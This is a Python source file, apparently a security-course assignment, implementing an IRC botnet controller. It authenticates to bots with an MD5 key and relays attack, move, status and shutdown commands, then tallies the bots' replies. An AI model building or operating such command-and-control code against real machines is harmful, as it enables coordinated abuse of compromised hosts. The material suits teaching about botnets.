'''
Last Name:          Champagne
First Name:         Steven
Course:             CPSC526
Assignment:         6: IRC Controller/Bot
Tutorial:           T03
Date:               2017-12-3
Files Submitted:    conbot.py, bot.py, readme.pdf

python version: 3.6.2

ARGS PROTOTYPE: conbot.py <hostname> <port> <channel> <secret-phrase>

HOW TO RUN (EXAMPLE): $ python3 conbot.py 162.246.156.17 12399 cpsc526 SECRET


NOTE TO SELF: $ echo -n <username><secret> | md5sum #to get the identify key from cmdline if needed.
'''

import argparse
import random
import string
import socket
import time
import sys
import select
import hashlib
import _thread

#parsing the args
parser = argparse.ArgumentParser(description="IRC CONTROL BOT.")
parser.add_argument("-d", "--debug", action="store_true", required=False, help="Activates using the default values & server provided for testing.")
parser.add_argument("hostname", type=str, help="IP or Host Name of IRC server.")
parser.add_argument("port", type=int, help="Port of host machine.")
parser.add_argument("channel", type=str, help="Channel of IRC server to connect to.")
parser.add_argument("secret_phrase", metavar='secret-phrase', type=str, help="Secret Phrase to control bots")
args = parser.parse_args()

if args.debug:
    print("DEBUG MODE")
    args.hostname = "162.246.156.17"
    args.port = 12399
    args.channel = "cpsc526"
    args.secret_phrase = "SECRET"

#globals
HOST = args.hostname
PORT = args.port #int, not string.
CHANNEL = '' #includes HASHTAG
SECRET = args.secret_phrase
NICK = ''
CONTROL_KEY = ''
IRC_CONN = None
STATUS_BOT_LIST = []
ATTACK_COUNTER = 1
ATTACK_SUCCESSES_LIST = []
ATTACK_FAILURES_LIST = []
MOVE_SUCCESSES_LIST = []
MOVE_FAILURES_LIST = []
SHUTDOWN_BOTS_LIST = []


def createNick():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))

#connect to IRC server.
def connect():
    global NICK, IRC_CONN, CHANNEL

    while True:
        nick = createNick()

        # connect to IRC
        irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        irc.settimeout(5.0)
        irc.connect((args.hostname, args.port))#need try catch around this
        irc.send(("NICK "+nick+"\n").encode())
        irc.send(("USER " + nick + ' * * : ' +nick+"\n").encode())

        # print results
        nickResponse = irc.recv(1024).decode("UTF-8")
        #print(nickResponse)#del
        if nickResponse.split()[1] == "433":
            #keep trying nicks with 5 second delay.
            try:
                time.sleep(5)
            except KeyboardInterrupt:
                pass #dont need to do anything cause not connected if here.
            continue
        elif nickResponse.split()[1] == "001":
            print("--> NICK:   ",nick)
            print("--> NICK AND USER ACCEPTED!")
            break

    # now join the channel
    channel = '#'+args.channel
    irc.send(('JOIN :' + channel + '\n').encode())
    joinChannelResponse = irc.recv(1024).decode("UTF-8")
    print("--> JOINED CHANNEL: " + channel)
    #print(joinChannelResponse)#del

    #now save the result
    CHANNEL=channel
    NICK=nick
    IRC_CONN=irc
    return

#sends a message to the irc channel of the form:
# PRIVMSG #channel :<message>
def sendMessageToChannel(message):
    global IRC_CONN
    ircMessage = "PRIVMSG " + CHANNEL + " :" + message + "\n"
    IRC_CONN.sendall(ircMessage.encode())
    return

def replyMessageToUser(user, message):#
    global IRC_CONN
    message = message.strip(":").split("!")[0]
    #print("REPLYING TO USER: " + user)#del
    ircMessage = "PRIVMSG " + user + " :" + message + "\n"
    IRC_CONN.sendall(ircMessage.encode())
    return

def status():
    global IRC_CONN, STATUS_BOT_LIST
    #reset the list
    STATUS_BOT_LIST = []
    #message the channel
    sendMessageToChannel("status")
    # get responses
    _thread.start_new_thread(reportStatus, ())
    return

def reportStatus():
    global STATUS_BOT_LIST
    #wait for responses
    time.sleep(3)
    print("--> STATUS REPORT: ")
    #report bot list results
    print("Found " + str(len(STATUS_BOT_LIST)) + " bots.")
    for bot in STATUS_BOT_LIST:
        print("BOT: " + bot + "REPORTING")
    return

def updateStatus(message):
    global STATUS_BOT_LIST
    m = message.strip(':').split('!')[0]
    #print("ADDED NAME: "+m+" TO STATUS LIST")
    STATUS_BOT_LIST.append(m)
    return


#sends the hexhash to channel to identify the conbot to bots
def identifySelf():
    global IRC_CONN, CHANNEL, CONTROL_KEY
    message = "PRIVMSG " + CHANNEL + " :" +"identify "+ CONTROL_KEY + "\n"
    #print(message)
    IRC_CONN.sendall(message.encode())
    return

#prints the help screen for the various commands
def printHelp():
    print(  "COMMAND LIST:" +
            "\nidentify: no args: MUST BE USED TO GET THE BOTS TO RECOGNISE YOU!" +
            "\nstatus: no args" +
            "\nattack: attack <host> <port>" +
            "\nmove: move <host> <port> <channel>" +
            "\nquit: no args" +
            "\nshutdown: no args"
    )
    return

#issues the attack command to the channel
def attack(message):
    global ATTACK_FAILURES_LIST, ATTACK_SUCCESSES_LIST

    #reset successes and failures lists
    ATTACK_SUCCESSES_LIST = []
    ATTACK_FAILURES_LIST = []

    #assert proper format of attack string
    m = message.split()
    if len(m) != 3:
        print("Invalid attack command format. Use: attack <host> <port>")
    try:
        host = m[1]
        port_string = m[2]
    except:
        print("Invalid args: attack <host> <port>")
        return
    if not port_string.isdigit():
        print("attack arg[2] must be digit.")
        return

    #send the message to the channel
    sendMessageToChannel(message)

    # get responses
    _thread.start_new_thread(reportAttacks, ())
    return

#thread function that reports the attack info.
def reportAttacks():
    global ATTACK_FAILURES_LIST, ATTACK_SUCCESSES_LIST
    #wait for reports
    time.sleep(4)
    print("--> ATTACK REPORT: ")

    for each in ATTACK_SUCCESSES_LIST:
        print("BOT: " + each + ": Attack Successful.")
    for each in ATTACK_FAILURES_LIST:
        print("BOT: " + each + ": Attack Failure.")

    print("Total: Successes: " + str(len(ATTACK_SUCCESSES_LIST)) + " Failures: " + str(len(ATTACK_FAILURES_LIST)) +".")
    return

#updates each sucessful attack result to the list
def updateAttackSuccesses(message):
    global ATTACK_SUCCESSES_LIST
    m = message.strip(':').split('!')[0]
    #print("ADDED NAME: "+m+" TO ATTACK SUCESS LIST")
    ATTACK_SUCCESSES_LIST.append(m)
    return

#updates each attack failure result to the list
def updateAttackFailures(message):
    global ATTACK_FAILURES_LIST
    m = message.strip(':').split('!')[0]
    #print("ADDED NAME: "+m+" TO ATTACK FAILURES LIST")
    ATTACK_FAILURES_LIST.append(m)
    return

# when read move from stdin
def moveOrder(message):
    global MOVE_SUCCESSES_LIST, MOVE_FAILURES_LIST

    #reset successes and failures lists
    MOVE_SUCCESSES_LIST = []
    MOVE_FAILURES_LIST = []

    #assert proper format of attack string
    m = message.split()
    if len(m) != 4:
        print("Invalid attack move format. Use: move <host> <port> <channel>")
    try:
        host = m[1]
        port_string = m[2]
        channel = m[3]
    except:
        print("Invalid args: move <host> <port> <channel>")
        return
    if not port_string.isdigit():
        print("move <port> arg must be digit.")
        return

    #send the message to the channel
    sendMessageToChannel(message)

    # get responses
    _thread.start_new_thread(reportMoves, ())
    return

def reportMoves():
    global MOVE_FAILURES_LIST, MOVE_SUCCESSES_LIST



    #wait for reports
    time.sleep(4)
    print("--> MOVE REPORT: ")

    for each in MOVE_SUCCESSES_LIST:
        print( each + ": Move Successful.")
    for each in MOVE_FAILURES_LIST:
        print( each + ": Move Failure.")

    print("Total: Successes: " + str(len(MOVE_SUCCESSES_LIST)) + " Failures: " + str(len(MOVE_FAILURES_LIST)) +".")
    return

def updateMoveSuccesses(message):
    global MOVE_SUCCESSES_LIST
    m = message.strip(':').split('!')[0]
    #print("ADDED NAME: "+m+" TO MOVE SUCCESS LIST")
    MOVE_SUCCESSES_LIST.append(m)
    return


def updateMoveFailures(message):
    global MOVE_FAILURES_LIST
    m = message.strip(':').split('!')[0]
    #print("ADDED NAME: "+m+" TO MOVE FAILURES LIST")
    MOVE_FAILURES_LIST.append(m)
    return


#sends shutdown botnet message to channel. and launches a thread to count bots that shutdown.
def shutdown():
    global SHUTDOWN_BOTS_LIST

    #reset shutdown list
    SHUTDOWN_BOTS_LIST = []

    #send the message to shutdown
    sendMessageToChannel("shutdown")

    # get responses
    _thread.start_new_thread(reportShutdown, ())

    return

def reportShutdown():
    global SHUTDOWN_BOTS_LIST
    time.sleep(4)
    print("--> SHUTDOWN REPORT: ")
    for each in SHUTDOWN_BOTS_LIST:
        print("BOT: " + each + " SHUTDOWN.")
    print("Total Shutdowns: "+ str(len(SHUTDOWN_BOTS_LIST)))
    return

def updateShutdownList(message):
    global SHUTDOWN_BOTS_LIST

    m = message.strip(':').split('!')[0]
    #print("ADDED NAME: "+m+" TO SHUTDOWN LIST")
    SHUTDOWN_BOTS_LIST.append(m)
    return


# the main 'switchboard' function
def select_handle():
    global IRC_CONN, NICK
    while True:
        #time.sleep(0.01) #to prevent high cpu usage
        try:
            #NOTE: might need to set socket to non-blocking
            readable, writeable, exceptable = select.select([IRC_CONN,sys.stdin],[sys.stdout],[])
        except KeyboardInterrupt:
            disconnect(IRC_CONN)
            sys.exit()
        except ValueError:
            disconnect(IRC_CONN)
            sys.exit()

        for _ in readable:
            #if from stdin
            if _ == sys.stdin:
                message = sys.stdin.readline()
                #if blank message do nothing.
                if message.strip('\n') == "":
                    continue

                command = message.split()
                #print("message:" + message)

                # check if it is a command in first position.
                if command[0] == "help":
                    printHelp()

                elif command[0] == "identify":
                    identifySelf()

                elif command[0] == "status":
                    status()

                elif command[0] == "attack":
                    attack(message)

                elif command[0] == "move":
                    moveOrder(message)

                elif command[0] == "quit":
                    disconnect(IRC_CONN)
                    CON_UP = False
                    break
                elif command[0] == "shutdown":
                    shutdown()

                else:
                    #else just send the message to the channel
                    sendMessageToChannel(message)
                    #IRC_CONN.sendall(message.encode())

            #if from irc
            if _ == IRC_CONN:

                message = IRC_CONN.recv(1024).decode("UTF-8")
                #print(message)
                #There may be multiple messages in a message so split them up.
                messages = message.strip().split("\n")
                #print(messages)#del

                for msg in messages:

                    split_msg = msg.split()

                    # return ping
                    if split_msg[0] == "PING":
                        pong = "PONG "+split_msg[1]+"\n"
                        #print(pong)
                        IRC_CONN.send(pong.encode())

                    # HAVE TO ENSURE ALL REPLIES ARE ONLY FROM MESSAGES DIRECTED TO ME. IGNORE OTHER USERS!
                    elif NICK in msg:
                        if "reporting*" in msg:
                            updateStatus(msg)

                        elif "request counter*" in msg:
                            # the bot requests an incremented number to include in its attack.
                            attackNumber(msg)

                        elif "attk successful*" in msg:
                            #is is a response to ATTACK
                            updateAttackSuccesses(msg)

                        elif "attk failed*" in msg:
                            #is is a response to ATTACK
                            updateAttackFailures(msg)

                        elif "switch successful*" in msg:
                            #is is a response to MOVE
                            updateMoveSuccesses(msg)

                        elif "switch failed*" in msg:
                            #is is a response to MOVE
                            updateMoveFailures(msg)

                        elif "shutting down*" in msg:
                            #is is a response to SHUTDOWN
                            updateShutdownList(msg)

                        else:
                            #print personal messages
                            #print(message)
                            pass

                    else:
                        #print every non personal channel message
                        #print(message)
                        pass

    return

# sends proceede <number>
def attackNumber(message):
    global ATTACK_COUNTER

    #print("MESSAGE TO PARSE: "+message)
    user = message.strip(':').split("!")[0]
    #print('SEND TO USER: '+user)
    # NEED A USER TO MESSAGE
    m = "proceede "+ str(ATTACK_COUNTER)
    replyMessageToUser(user, m)
    ATTACK_COUNTER = ATTACK_COUNTER +1
    return

#disconnect from a specific IRC server socket.
def disconnect(soc):
    soc.close()

#from hash of nick+secret, generate the control key.
#saves hex md5 digest to global variable
def generateControlKey():
    global SECRET, NICK, CONTROL_KEY

    #combine nick and secret in string
    nick_secret = NICK + SECRET
    #print(nick_secret)#del

    # hash it
    m = hashlib.md5()
    m.update(nick_secret.encode())
    conkey = m.hexdigest()

    #save results
    CONTROL_KEY=conkey
    print("--> Secret Control Key Created: "+CONTROL_KEY)#del
    return


def Main():
    global NICK, CONTROL_KEY, IRC_CONN

    print("--> HOST:   ",HOST)
    print("--> PORT:   ",PORT)
    print("--> CHANNEL:",CHANNEL)#del
    print("--> SECRET: ",SECRET)

    #connect to irc with name and channel from args
    connect()

    #genereate controller key
    generateControlKey()

    # use select to handle irc comms and user inputs
    select_handle()









if __name__ == "__main__":
    Main()
